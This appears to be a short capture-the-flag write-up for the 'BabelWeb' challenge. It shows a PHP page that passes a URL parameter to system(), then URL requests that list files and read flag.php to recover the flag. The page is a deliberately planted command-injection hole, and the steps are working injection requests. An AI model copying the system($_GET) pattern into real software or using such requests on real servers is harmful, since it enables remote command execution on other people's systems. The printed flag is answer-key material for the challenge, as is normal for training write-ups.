# BabelWeb

- Launch Web server
- Go to the following URL: http://localhost:8080
- You should see a page with a title "BabelWeb"
  - Go to inspect element (F12)
  - Go to the console tab
  - Go to `sources` tab

- You get this code:

```php
<?php
    if (isset($_GET['source'])) {
        @show_source(__FILE__);
    }  else if(isset($_GET['code'])) {
        print("<pre>");
        @system($_GET['code']);
        print("<pre>");
    } else {
?>
<html>
    <head>
        <title>Bienvenue à Babel Web!</title>
    </head>    
    <body>
        <h1>Bienvenue à Babel Web!</h1>
        La page est en cours de développement, merci de revenir plus tard.
        <!-- <a href="?source=1">source</a> -->
    </body>
</html>
<?php
    }
?>
```

- Go to http://localhost:8000/?code
  - You see the `<pre>` tag that allow to run code
- Use http://localhost:8000/?code=ls
  - You find 2 files:
    ```php
    flag.php
    index.php
    ```

- You use the cmd = "cat < flag.php" to get the code
  - http://localhost:8000/?code=cat%20%3C%20flag.php

```html
<!--?php
	$flag = "FCSC{5d969396bb5592634b31d4f0846d945e4befbb8c470b055ef35c0ac090b9b8b7}";
<pre-->
```

- Code: `FCSC{5d969396bb5592634b31d4f0846d945e4befbb8c470b055ef35c0ac090b9b8b7}`

